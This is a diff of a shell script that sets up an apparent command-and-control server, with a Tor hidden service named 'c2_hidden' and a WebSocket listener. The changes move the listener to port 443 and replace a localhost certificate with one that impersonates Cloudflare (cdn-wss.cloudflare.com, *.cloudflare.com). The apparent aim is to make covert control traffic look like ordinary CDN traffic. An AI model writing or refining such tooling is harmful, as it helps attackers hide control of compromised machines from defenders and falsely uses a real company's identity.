@@ -54,7 +54,7 @@ sed -i '/c2_hidden/d' "$TORRC" 2>/dev/null
 if ! grep -q "c2_hidden" "$TORRC" 2>/dev/null; then
     cat >> "$TORRC" << 'EOF'
 HiddenServiceDir /var/lib/tor/c2_hidden/
-HiddenServicePort 443 127.0.0.1:8443
+HiddenServicePort 443 127.0.0.1:443
 EOF
 fi
 
@@ -75,9 +75,11 @@ ok "Tor hidden service: ${GREEN}${ONION}${NC}"
 # ── Step 3: Generate TLS certificate ──
 banner "Generating TLS certificate..."
 if [[ ! -f "$DIR/cert.pem" ]] || [[ ! -f "$DIR/key.pem" ]]; then
-    openssl req -x509 -newkey rsa:2048 \
+    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
         -keyout "$DIR/key.pem" -out "$DIR/cert.pem" \
-        -days 365 -nodes -subj '/CN=localhost' 2>/dev/null
+        -days 730 -nodes \
+        -subj '/C=US/ST=California/O=Cloudflare Inc/CN=cdn-wss.cloudflare.com' \
+        -addext 'subjectAltName=DNS:cdn-wss.cloudflare.com,DNS:*.cloudflare.com' 2>/dev/null
     chown "$REAL_USER:$REAL_USER" "$DIR/key.pem" "$DIR/cert.pem"
     ok "TLS cert generated"
 else
@@ -177,7 +179,7 @@ cleanup() {
 trap cleanup EXIT INT TERM
 
 # ── Step 10: Start listener ──
-banner "Starting WSS listener on port 8443..."
+banner "Starting WSS listener on port 443..."
 echo ""
 cd "$DIR"
-python3 listener.py 8443
+python3 listener.py 443
